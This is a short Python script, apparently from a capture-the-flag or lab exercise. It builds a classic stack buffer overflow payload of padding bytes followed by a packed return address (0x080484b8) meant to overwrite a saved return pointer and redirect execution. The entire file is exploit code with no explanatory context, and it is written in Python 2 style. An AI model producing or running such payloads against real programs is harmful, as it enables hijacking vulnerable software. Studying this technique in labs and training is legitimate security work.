#payload.py
from struct import pack

ret_addr = 0x080484b8

output = "A" * 10
output += "BBBB"
output += "CCCC"
output += pack("<I", ret_addr)

print(output)